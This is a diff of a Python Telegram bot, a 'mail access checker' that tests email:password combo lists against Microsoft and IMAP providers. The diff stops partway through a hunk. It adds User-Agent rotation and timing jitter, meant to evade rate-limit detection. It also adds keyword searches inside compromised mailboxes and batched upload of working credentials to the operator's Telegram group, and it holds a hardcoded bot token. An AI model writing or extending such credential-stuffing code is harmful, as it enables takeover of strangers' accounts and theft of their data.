@@ -17,18 +17,46 @@ import email as email_lib
 from email.header import decode_header as decode_hdr
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime, timedelta
-import socket
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ------------------- Stealth: User-Agent rotation (from test.py) -------------------
+_STEALTH_USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
+_STEALTH_ACCEPT_LANGS = [
+    "en-US,en;q=0.9",
+    "en-GB,en;q=0.8,en-US;q=0.7",
+    "en-US,en;q=0.7,fr;q=0.5",
+    "en-US,en;q=0.9,de;q=0.7",
+]
+
+def _rand_ua() -> str:
+    return random.choice(_STEALTH_USER_AGENTS)
+
+def _rand_lang() -> str:
+    return random.choice(_STEALTH_ACCEPT_LANGS)
+
+def _stealth_jitter(min_s=0.05, max_s=0.25):
+    """Small random pause to avoid strict rate-limit fingerprinting."""
+    time.sleep(random.uniform(min_s, max_s))
 
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8650837363:AAGc7cfEhAHponP_4zTeVL7QeB4PZ1tTRP8")
 GROUP_ID = int(os.getenv("TELEGRAM_GROUP_ID", "-1002893702017"))
 API_BASE = "https://api.telegram.org/bot"
 FILE_BASE = "https://api.telegram.org/file/bot"
-PRIMARY_INSTANCE = os.getenv("PRIMARY_INSTANCE", "false").strip().lower() in ("1", "true", "yes", "on")
-INSTANCE_ID = os.getenv("INSTANCE_ID", f"{socket.gethostname()}-{os.getpid()}-{uuid.uuid4().hex[:6]}")
-INSTANCE_PRIORITY = int(os.getenv("INSTANCE_PRIORITY", "1"))
-LEADER_LEASE_SECONDS = int(os.getenv("LEADER_LEASE_SECONDS", "60"))
-IS_LEADER = PRIMARY_INSTANCE
-INTRO_TEXT = "This bot for check Microsoft accounts\n\nMain channel : @anon_main1\n\nEnjoy"
+PRIMARY_INSTANCE = os.getenv("PRIMARY_INSTANCE", "true").strip().lower() in ("1", "true", "yes", "on")
 
 def api(method, data=None, files=None):
     r = requests.post(f"{API_BASE}{BOT_TOKEN}/{method}", data=data, files=files, timeout=60)
@@ -41,7 +69,8 @@ def get_updates(offset=None, timeout=30):
     return api("getUpdates", data)
 
 def send_message(chat_id, text, reply_markup=None):
-    if not IS_LEADER:
+    # Gate only group/channel sends; always reply in private/user chats
+    if not PRIMARY_INSTANCE and chat_id in (GROUP_ID, CONTROL_GROUP_ID):
         return {"ok": True, "result": {"message_id": None}}
     data = {"chat_id": chat_id, "text": text}
     if reply_markup:
@@ -49,7 +78,8 @@ def send_message(chat_id, text, reply_markup=None):
     return api("sendMessage", data)
 
 def edit_message(chat_id, message_id, text):
-    if not IS_LEADER:
+    # Gate only group/channel edits; always edit in private/user chats
+    if not PRIMARY_INSTANCE and chat_id in (GROUP_ID, CONTROL_GROUP_ID):
         return {"ok": True, "result": {"message_id": message_id}}
     data = {"chat_id": chat_id, "message_id": message_id, "text": text}
     return api("editMessageText", data)
@@ -97,7 +127,7 @@ def try_claim_vip(user_id, code):
     if time.time() > info["expires"]:
         return False, "Code expired"
     if info["claimed_by"] and info["claimed_by"] != user_id:
-        return False, "Code already used"
+        return False, "❌ This code has already been used by another user"
     
     info["claimed_by"] = user_id
     vip_users_info[user_id] = {"expires": time.time() + info["duration"], "code": code_str}
@@ -147,7 +177,8 @@ def check_vip_expiry():
 threading.Thread(target=check_vip_expiry, daemon=True).start()
 
 def send_document(chat_id, path, caption=None):
-    if not IS_LEADER:
+    # Gate only group/channel documents; always send to private/user chats
+    if not PRIMARY_INSTANCE and chat_id in (GROUP_ID, CONTROL_GROUP_ID):
         return {"ok": True, "result": {"message_id": None}}
     with open(path, "rb") as f:
         files = {"document": f}
@@ -155,45 +186,6 @@ def send_document(chat_id, path, caption=None):
         if caption:
             data["caption"] = caption
         return api("sendDocument", data, files=files)
-
-def get_my_description():
-    j = api("getMyDescription", {})
-    if not j.get("ok"):
-        return ""
-    res = j.get("result") or {}
-    return res.get("description") or ""
-
-def set_my_description(desc):
-    return api("setMyDescription", {"description": desc})
-
-def get_leader_desc():
-    try:
-        j = api("getChat", {"chat_id": CONTROL_GROUP_ID})
-        if not j.get("ok"):
-            return ""
-        return (j.get("result") or {}).get("description") or ""
-    except:
-        return ""
-
-def set_leader_desc(desc):
-    try:
-        return api("setChatDescription", {"chat_id": CONTROL_GROUP_ID, "description": desc})
-    except:
-        return {"ok": False}
-
-def _parse_leader(desc):
-    try:
-        parts = dict([tuple(p.split(":", 1)) for p in desc.split(";") if ":" in p])
-        leader = parts.get("LEADER")
-        pr = int(parts.get("PRIORITY", "9999"))
-        exp = int(parts.get("EXPIRES", "0"))
-        return leader, pr, exp
-    except:
-        return None, 9999, 0
-
-def _make_leader_record(iid, pr, ttl):
-    exp = int(time.time()) + ttl
-    return f"LEADER:{iid};PRIORITY:{pr};EXPIRES:{exp}"
 
 # ------------------- Dates and Currency Helpers (from q.py) -------------------
 from datetime import datetime
@@ -278,9 +270,22 @@ class UnifiedChecker:
         self.session = requests.Session()
         self.session.trust_env = False
         self.session.proxies = {}
-        adapter = requests.adapters.HTTPAdapter(pool_connections=128, pool_maxsize=256, max_retries=0)
+        # High-performance connection pool (no retries = faster failure detection)
+        adapter = requests.adapters.HTTPAdapter(
+            pool_connections=128,
+            pool_maxsize=256,
+            max_retries=0,
+        )
         self.session.mount('https://', adapter)
         self.session.mount('http://', adapter)
+        # Stealth: randomize UA per checker instance
+        self.session.headers.update({
+            "User-Agent": _rand_ua(),
+            "Accept-Language": _rand_lang(),
+            "Accept-Encoding": "gzip, deflate",
+            "Cache-Control": "no-cache",
+            "Pragma": "no-cache",
+        })
         self.uuid = str(uuid.uuid4())
         self.debug = debug
         self.services_map = custom_services or {
@@ -351,9 +356,9 @@ class UnifiedChecker:
             r1 = self.session.get(url1, headers=h1, timeout=15)
             if "MSAccount" not in r1.text:
                 return None
-            time.sleep(0.3)
+            _stealth_jitter(0.1, 0.4)
             url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-            r2 = self.session.get(url2, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True, timeout=15)
+            r2 = self.session.get(url2, headers={"User-Agent": _rand_ua(), "Accept-Language": _rand_lang()}, allow_redirects=True, timeout=15)
             m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
             m_ppft = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
             if not m_url or not m_ppft:
@@ -363,7 +368,8 @@ class UnifiedChecker:
             login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
             h3 = {
                 "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0",
+                "User-Agent": _rand_ua(),
+                "Accept-Language": _rand_lang(),
                 "Origin": "https://login.live.com",
                 "Referer": r2.url
             }
@@ -406,12 +412,12 @@ class UnifiedChecker:
                 return None
             if "MSAccount" not in r1.text:
                 return None
-            time.sleep(0.3)
+            _stealth_jitter(0.1, 0.4)
             url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
             headers2 = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "User-Agent": _rand_ua(),
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Language": _rand_lang(),
                 "Connection": "keep-alive"
             }
             r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
@@ -424,8 +430,9 @@ class UnifiedChecker:
             login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
             headers3 = {
                 "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "User-Agent": _rand_ua(),
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": _rand_lang(),
                 "Origin": "https://login.live.com",
                 "Referer": r2.url
             }
@@ -917,6 +924,7 @@ class UnifiedChecker:
                 "services": found_services,
                 "service_details": service_details,
                 "_access_token": at,
+                "_cid": cid,
                 "_refresh_token": auth.get("refresh_token", ""),
                 **msr,
                 **nf,
@@ -1125,7 +1133,7 @@ class ImapChecker:
         self.hits = 0
         self._lock = threading.Lock()
 
-    def check(self, email_addr, password):
+    def check(self, email_addr, password, target_keywords=None):
         try:
             mail = _imap_connect(email_addr, password)
             if not mail:
@@ -1140,8 +1148,8 @@ class ImapChecker:
                         msg_count = len(data2[0].split())
             except Exception:
                 pass
-            # Scan services
-            services_found = self._scan_services(mail)
+            # Scan services AND target keywords in one pass
+            services_found, kw_counts = self._scan_services(mail, target_keywords or [])
             try:
                 mail.logout()
             except Exception:
@@ -1157,6 +1165,7 @@ class ImapChecker:
                 "xbox": {"status": "N/A"},
                 "ms_data": {},
                 "services": {svc: True for svc in services_found},
+                "kw_counts": kw_counts,
                 "imap_mode": True,
                 "psn_status": "NONE",
                 "steam_status": "NONE",
@@ -1168,12 +1177,13 @@ class ImapChecker:
         except Exception:
             return {"status": "BAD"}
 
-    def _scan_services(self, mail):
+    def _scan_services(self, mail, target_keywords=None):
         found = set()
+        kw_counts = {kw: 0 for kw in (target_keywords or [])}
         try:
             r, data = mail.search(None, 'ALL')
             if r != 'OK' or not data[0]:
-                return list(found)
+                return list(found), kw_counts
             ids = data[0].split()
             for eid in ids[-500:]:
                 try:
@@ -1183,14 +1193,20 @@ class ImapChecker:
                     raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
                     msg = email_lib.message_from_bytes(raw)
                     sender = _decode_mime(msg.get('From', '')).lower()
+                    subject = _decode_mime(msg.get('Subject', '')).lower()
                     for svc, pattern in IMAP_SERVICES.items():
                         if pattern in sender:
                             found.add(svc)
+                    # Check user target keywords
+                    for kw in (target_keywords or []):
+                        k = kw.lower().strip()
+                        if k and (k in sender or k in subject):
+                            kw_counts[kw] = kw_counts.get(kw, 0) + 1
                 except:
                     continue
         except:
             pass
-        return list(found)
+        return list(found), kw_counts
 
 def _imap_fetch_emails(email_addr, password, folder='INBOX', count=100, cancel_event=None):
     """Fetch last N emails from a folder via IMAP"""
@@ -1327,6 +1343,16 @@ class ScanSession:
         self.search_keywords = []
         self.search_results = []
         self.search_status_msg_id = None
+        # VIP target keyword tracking (during scan)
+        self.awaiting_target_keywords = False   # asking VIP user for scan target keywords
+        self.target_keywords = []               # e.g. ["netflix", "facebook.com"]
+        self.ms_target_counts = {}              # kw -> count for MS accounts
+        self.mix_target_counts = {}             # kw -> count for MIX/IMAP accounts
+        self.batch_mix = []                     # IMAP/MIX hits batch (separate from MS)
+        self.batch_target_ms = []               # MS accounts matching target keywords
+        self.batch_target_mix = []              # MIX accounts matching target keywords
+        self.ms_hits_last_flush = 0             # MS hit count at last 100-batch flush
+        self.mix_hits_last_flush = 0            # MIX hit count at last 100-batch flush
 
     def stop(self):
         self.stop_ev.set()
@@ -1336,37 +1362,6 @@ class BotApp:
         self.offset = None
         self.sessions = {}
         self.lock = threading.Lock()
-        self._last_leader_tick = 0
-        self._leader_desc_cache = ""
-    
-    def _leader_tick(self):
-        global IS_LEADER
-        now = time.time()
-        if now - self._last_leader_tick < 10:
-            return
-        self._last_leader_tick = now
-        try:
-            desc = get_leader_desc() or ""
-            leader, pr, exp = _parse_leader(desc) if desc else (None, 9999, 0)
-            expired = exp < int(now)
-            if leader and not expired:
-                if INSTANCE_PRIORITY < pr:
-                    rec = _make_leader_record(INSTANCE_ID, INSTANCE_PRIORITY, LEADER_LEASE_SECONDS)
-                    set_leader_desc(rec)
-                    IS_LEADER = True
-                else:
-                    if leader == INSTANCE_ID:
-                        rec = _make_leader_record(INSTANCE_ID, INSTANCE_PRIORITY, LEADER_LEASE_SECONDS)
-                        set_leader_desc(rec)
-                        IS_LEADER = True
-                    else:
-                        IS_LEADER = False
-            else:
-                rec = _make_leader_record(INSTANCE_ID, INSTANCE_PRIORITY, LEADER_LEASE_SECONDS)
-                set_leader_desc(rec)
-                IS_LEADER = True
-        except:
-            IS_LEADER = PRIMARY_INSTANCE
     
     def _send_search_status(self, sess: ScanSession, chat_id, keywords, force=False):
         now = time.time()
@@ -1540,6 +1535,12 @@ class BotApp:
             # Microsoft status
             countries_ms = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
             services_ms = ", ".join([f"{k}:{v}" for k, v in sorted(sess.ms_service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
+            # Target keywords line for MS
+            if sess.target_keywords:
+                tgt_ms = ", ".join([f"{kw}({sess.ms_target_counts.get(kw, 0)})" for kw in sess.target_keywords])
+                ms_target_line = f"your target : {tgt_ms}\n"
+            else:
+                ms_target_line = ""
             ms_msg = (
                 f"Q bot mail access checker{vip_tag}\n"
                 f"check microsoft ( hotmail , outlook , etc )\n"
@@ -1548,19 +1549,27 @@ class BotApp:
                 f"xbox : {sess.xbox_premium}\n"
                 f"country : {countries_ms}\n"
                 f"services : {services_ms}\n"
+                f"{ms_target_line}"
                 "By : anon\n"
                 "channel : @anon_main1"
             )
             # MIX status
-            types_str = ", ".join([f"{dom}:{count}" for dom, count in sess.imap_hits_by_domain.items()]) or "-"
+            mix_emails_found = sum(sess.imap_hits_by_domain.values()) if sess.imap_hits_by_domain else sess.mix_hits
             services_mix = ", ".join([f"{k}:{v}" for k, v in sorted(sess.mix_service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
+            # Target keywords line for MIX
+            if sess.target_keywords:
+                tgt_mix = ", ".join([f"{kw}({sess.mix_target_counts.get(kw, 0)})" for kw in sess.target_keywords])
+                mix_target_line = f"your target : {tgt_mix}\n"
+            else:
+                mix_target_line = ""
             mix_msg = (
                 f"Q bot mail access checker{vip_tag}\n"
                 f"check mix ( t-online.de , gmx , etc )\n"
                 f"hits : {sess.mix_hits}\n"
                 f"bad : {sess.mix_bads}\n"
-                f"type : {types_str}\n"
+                f"emails found : {mix_emails_found}\n"
                 f"services : {services_mix}\n"
+                f"{mix_target_line}"
                 "By : anon\n"
                 "channel : @anon_main1"
             )
@@ -1589,74 +1598,70 @@ class BotApp:
     def _flush_batch(self, sess: ScanSession, chat_id, flush_all=False):
         with sess.hits_batch_lock:
             try:
+                vip_tag = " [VIP]" if chat_id in vip_users_info else ""
+                user_tag = sess.username or str(chat_id)
+                FLUSH_SIZE = 100
+
                 def send_with_retries(path, caption):
-                    tries = 3
-                    for i in range(tries):
+                    for i in range(3):
                         try:
                             resp = send_document(chat_id, path, caption=caption)
                             if isinstance(resp, dict) and not resp.get("ok", False):
-                                raise RuntimeError("telegram send failed")
+                                raise RuntimeError("send failed")
                             return True
                         except:
                             time.sleep(2 * (i + 1))
                     return False
-                def send_batches(lines, filename, force_all=False):
-                    base = filename.split('.')[0]
-                    sent_any = False
-                    while len(lines) >= 50:
-                        chunk = lines[:50]
-                        unique_name = f"{base}_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
-                        xpath = os.path.join(os.getcwd(), unique_name)
+
+                def send_batches(lines, file_prefix, caption_label, force_all=False):
+                    """Send lines in chunks of FLUSH_SIZE with descriptive captions."""
+                    while len(lines) >= FLUSH_SIZE:
+                        chunk = lines[:FLUSH_SIZE]
+                        fname = f"{file_prefix}_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
+                        xpath = os.path.join(os.getcwd(), fname)
                         with open(xpath, "w", encoding="utf-8") as f:
                             f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in chunk])
-                        ok = send_with_retries(xpath, caption=f"{base} batch (50)")
+                        ok = send_with_retries(xpath, caption=f"📄 {caption_label} | {FLUSH_SIZE} hits")
                         if ok:
                             try:
-                                vip_tag = " [VIP]" if chat_id in vip_users_info else ""
-                                user_tag = sess.username or str(chat_id)
-                                try:
-                                    resp_g = send_document(GROUP_ID, xpath, caption=f"{user_tag}{vip_tag} | {base} batch (50)")
-                                    if isinstance(resp_g, dict) and not resp_g.get("ok", False):
-                                        pass
-                                except:
-                                    pass
-                            finally:
-                                try: os.remove(xpath)
-                                except: pass
-                            del lines[:50]
-                            sent_any = True
+                                send_document(GROUP_ID, xpath, caption=f"{user_tag}{vip_tag} | {caption_label} ({FLUSH_SIZE})")
+                            except: pass
+                            try: os.remove(xpath)
+                            except: pass
+                            del lines[:FLUSH_SIZE]
                         else:
                             try: os.remove(xpath)
                             except: pass
                             break
                     if force_all and lines:
                         chunk = lines[:]
-                        unique_name = f"{base}_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
-                        xpath = os.path.join(os.getcwd(), unique_name)
+                        fname = f"{file_prefix}_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
+                        xpath = os.path.join(os.getcwd(), fname)
                         with open(xpath, "w", encoding="utf-8") as f:
                             f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in chunk])
-                        ok = send_with_retries(xpath, caption=f"{base} batch ({len(chunk)})")
+                        ok = send_with_retries(xpath, caption=f"📄 {caption_label} | {len(chunk)} hits")
                         if ok:
                             try:
-                                vip_tag = " [VIP]" if chat_id in vip_users_info else ""
-                                user_tag = sess.username or str(chat_id)
-                                try:
-                                    resp_g = send_document(GROUP_ID, xpath, caption=f"{user_tag}{vip_tag} | {base} batch ({len(chunk)})")
-                                    if isinstance(resp_g, dict) and not resp_g.get("ok", False):
-                                        pass
-                                except:
-                                    pass
-                            finally:
-                                try: os.remove(xpath)
-                                except: pass
+                                send_document(GROUP_ID, xpath, caption=f"{user_tag}{vip_tag} | {caption_label} ({len(chunk)})")
+                            except: pass
+                            try: os.remove(xpath)
+                            except: pass
                             lines.clear()
-                            sent_any = True
                         else:
                             try: os.remove(xpath)
                             except: pass
-                    return sent_any
-                send_batches(sess.batch, "hits.txt", force_all=flush_all)
-                send_batches(sess.batch_xbox, "xbox.txt", force_all=flush_all)
+
+                # Microsoft hits
+                send_batches(sess.batch, "ms_hits", "Microsoft Hits", force_all=flush_all)
+                # Xbox premium (separate file)
+                send_batches(sess.batch_xbox, "xbox", "Xbox Premium", force_all=flush_all)
+                # MIX/IMAP hits (separate file)
+                send_batches(sess.batch_mix, "mix_hits", "MIX / IMAP Hits", force_all=flush_all)
+                # Target keyword MS hits (separate file)
+                if sess.target_keywords:
+                    kw_label = ", ".join(sess.target_keywords[:3])
+                    send_batches(sess.batch_target_ms, "target_ms", f"MS Target [{kw_label}]", force_all=flush_all)
+                    send_batches(sess.batch_target_mix, "target_mix", f"MIX Target [{kw_label}]", force_all=flush_all)
             except:
                 pass
 
@@ -1679,7 +1684,6 @@ class BotApp:
         
         is_vip = (chat_id in vip_users_info)
         vip_tag = " [VIP]" if is_vip else ""
-        flush_threshold = 50
         
         send_message(chat_id, f"Started {mode_name} scan: {sess.total} accounts{vip_tag}", reply_markup=kb)
         self._send_status(sess, chat_id, force=True)
@@ -1692,9 +1696,10 @@ class BotApp:
                 ms_domains = ('outlook.', 'hotmail.', 'live.', 'msn.', 'windowslive.')
                 is_ms = any(d in em for d in ms_domains)
                 if not is_ms:
+                    # -------- MIX / IMAP branch --------
                     try:
                         checker = ImapChecker()
-                        r = checker.check(em, pw)
+                        r = checker.check(em, pw, target_keywords=sess.target_keywords)
                     except:
                         r = {"status": "BAD"}
                     if sess.stop_ev.is_set():
@@ -1702,9 +1707,6 @@ class BotApp:
                     with self.lock:
                         sess.checked += 1
                         sess.mix_checked += 1
-                        is_vip_local = (chat_id in vip_users_info)
-                        if is_vip_local and (sess.checked % 200 == 0):
-                            self._flush_batch(sess, chat_id, flush_all=True)
                     if r and r.get("status") == "HIT":
                         line = f"{em}:{pw}"
                         sv = r.get("services", {}) or {}
@@ -1712,6 +1714,9 @@ class BotApp:
                         if sv_found:
                             line += f" | Services: {', '.join(sv_found)}"
                         dom = em.split("@")[-1].lower()
+                        # Keyword counts for this MIX hit
+                        kw_counts = r.get("kw_counts", {})
+                        kw_found = {kw: c for kw, c in kw_counts.items() if c > 0}
                         with self.lock:
                             sess.results.append(line)
                             sess.hits += 1
@@ -1721,15 +1726,26 @@ class BotApp:
                                 if v:
                                     sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
                                     sess.mix_service_counts[k] = sess.mix_service_counts.get(k, 0) + 1
+                            # Update target keyword counters
+                            for kw in kw_found:
+                                sess.mix_target_counts[kw] = sess.mix_target_counts.get(kw, 0) + 1
                         with sess.hits_batch_lock:
-                            sess.batch.append(line)
-                            if len(sess.batch) >= flush_threshold:
+                            sess.batch_mix.append(line)  # MIX separate batch
+                            # Also add to target batch if any keyword matched
+                            if kw_found and sess.target_keywords:
+                                kw_str = ", ".join([f"{kw}({c})" for kw, c in kw_found.items()])
+                                target_line = f"{line} | target: {kw_str}"
+                                sess.batch_target_mix.append(target_line)
+                            # Flush MIX every 100 hits
+                            if sess.mix_hits - sess.mix_hits_last_flush >= 100:
+                                sess.mix_hits_last_flush = sess.mix_hits
                                 self._flush_batch(sess, chat_id, flush_all=False)
                     else:
                         with self.lock:
                             sess.bads += 1
                             sess.mix_bads += 1
                 else:
+                    # -------- Microsoft branch --------
                     try:
                         checker = UnifiedChecker(debug=False)
                         if getattr(sess, "custom_domains", None):
@@ -1747,19 +1763,26 @@ class BotApp:
                     with self.lock:
                         sess.checked += 1
                         sess.ms_checked += 1
-                        is_vip_local = (chat_id in vip_users_info)
-                        if is_vip_local and (sess.checked % 200 == 0):
-                            self._flush_batch(sess, chat_id, flush_all=True)
                     if r and r.get("status") == "HIT":
                         line = format_result(r)
                         sv = r.get("services", {}) or {}
-                        sv_found = [k for k, v in sv.items() if v]
-                        services_line = None
                         xbox_line = None
                         xb = (r.get("xbox") or {})
                         xdet = xb.get("details") or ""
                         if (xb.get("status","").upper() != "FREE") and xdet:
                             xbox_line = f"{r.get('email','')}:{r.get('password','')} | Xbox: {xdet}"
+                        # Target keyword check using already-obtained access token
+                        kw_found = {}
+                        if sess.target_keywords:
+                            at = r.get("_access_token", "")
+                            cid = r.get("_cid", "")
+                            if at:
+                                try:
+                                    for kw in sess.target_keywords:
+                                        count = checker._search_count(at, cid, kw, timeout=8)
+                                        if count > 0:
+                                            kw_found[kw] = count
+                                except: pass
                         with self.lock:
                             sess.results.append(line)
                             sess.hits += 1
@@ -1774,16 +1797,25 @@ class BotApp:
                             if c not in sess.country_results:
                                 sess.country_results[c] = []
                             sess.country_results[c].append(line)
-                            sv = r.get("services", {}) or {}
                             for k, v in sv.items():
                                 if v:
                                     sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
                                     sess.ms_service_counts[k] = sess.ms_service_counts.get(k, 0) + 1
+                            # Update target keyword counters
+                            for kw in kw_found:
+                                sess.ms_target_counts[kw] = sess.ms_target_counts.get(kw, 0) + 1
                         with sess.hits_batch_lock:
-                            sess.batch.append(line)
+                            sess.batch.append(line)   # MS hits batch
                             if xbox_line:
                                 sess.batch_xbox.append(xbox_line)
-                            if len(sess.batch) >= flush_threshold:
+                            # Also add to target batch if any keyword matched
+                            if kw_found and sess.target_keywords:
+                                kw_str = ", ".join([f"{kw}({c})" for kw, c in kw_found.items()])
+                                target_line = f"{line} | target: {kw_str}"
+                                sess.batch_target_ms.append(target_line)
+                            # Flush MS every 100 hits
+                            if sess.ms_hits - sess.ms_hits_last_flush >= 100:
+                                sess.ms_hits_last_flush = sess.ms_hits
                                 self._flush_batch(sess, chat_id, flush_all=False)
                     else:
                         with self.lock:
@@ -1791,7 +1823,6 @@ class BotApp:
                             sess.ms_bads += 1
                 if sess.checked % 20 == 0:
                     self._send_status(sess, chat_id)
-                time.sleep(0 if (chat_id in vip_users_info) else 0.0)
             max_w = max(16, min(128, (os.cpu_count() or 4) * 8))
             ex = ThreadPoolExecutor(max_workers=max_w)
             fs = [ex.submit(worker, acc) for acc in sub_accounts]
@@ -1858,39 +1889,72 @@ class BotApp:
             sess = self.sessions.get(chat_id)
         if not sess:
             return
-        # flush remaining batch (send أي شيء أقل من 50 أيضاً)
         self._flush_batch(sess, chat_id, flush_all=True)
         try:
-            name = f"results_{uuid.uuid4().hex[:8]}.txt"
-            path = os.path.join(os.getcwd(), name)
-            with open(path, "w", encoding="utf-8") as f:
-                for ln in sess.results:
-                    f.write(ln + " | BY : @T_Q_mailbot\n")
-            # xbox file (separate)
-            xbox_path = None
+            vip_tag = " [VIP]" if chat_id in vip_users_info else ""
+            user_tag = sess.username or str(chat_id)
+            summary = f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}"
+
+            def _send_final_file(lines, file_prefix, caption_user, caption_group):
+                if not lines:
+                    return
+                try:
+                    fname = f"{file_prefix}_{uuid.uuid4().hex[:8]}.txt"
+                    fpath = os.path.join(os.getcwd(), fname)
+                    with open(fpath, "w", encoding="utf-8") as f:
+                        for ln in lines:
+                            f.write(ln + " | BY : @T_Q_mailbot\n")
+                    send_document(chat_id, fpath, caption=caption_user)
+                    try:
+                        send_document(GROUP_ID, fpath, caption=f"{user_tag}{vip_tag} | {caption_group}")
+                    except: pass
+                    try: os.remove(fpath)
+                    except: pass
+                except: pass
+
+            # Separate MS hits
+            ms_results = [ln for ln in sess.results if not getattr(sess, '_is_mix_line', lambda l: False)(ln)]
+            # Build ms vs mix result lists
+            ms_lines = []
+            mix_lines = []
+            all_mix_emails = {ln.split(":")[0].lower() for ln in (sess.batch_mix or []) if ":" in ln}
+            for ln in sess.results:
+                em = ln.split(":")[0].lower().strip()
+                if em in all_mix_emails or any(d in em for d in ('gmail.', 'yahoo.', 'icloud.', 'aol.', 'yandex.', 'mail.ru', 'gmx.', 'web.de', 'fastmail.', 'zoho.')):
+                    mix_lines.append(ln)
+                else:
+                    ms_lines.append(ln)
+
+            _send_final_file(ms_lines, "ms_hits_final",
+                             f"✅ Microsoft Hits | {summary}",
+                             f"Microsoft Hits | {summary}")
+            _send_final_file(mix_lines, "mix_hits_final",
+                             f"✅ MIX / IMAP Hits | Hits: {sess.mix_hits} | Bads: {sess.mix_bads}",
+                             f"MIX Hits | {sess.mix_hits} hits")
+            # Xbox premium separate
             if sess.results_xbox:
-                xbox_name = f"xbox_{uuid.uuid4().hex[:8]}.txt"
-                xbox_path = os.path.join(os.getcwd(), xbox_name)
-                with open(xbox_path, "w", encoding="utf-8") as f:
-                    for ln in sess.results_xbox:
-                        f.write(ln + " | BY : @T_Q_mailbot\n")
-            send_document(chat_id, path, caption=f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
-            if xbox_path:
-                send_document(chat_id, xbox_path, caption=f"xbox ({len(sess.results_xbox)})")
-            try:
-                vip_tag = " [VIP]" if chat_id in vip_users_info else ""
-                user_tag = sess.username or str(chat_id)
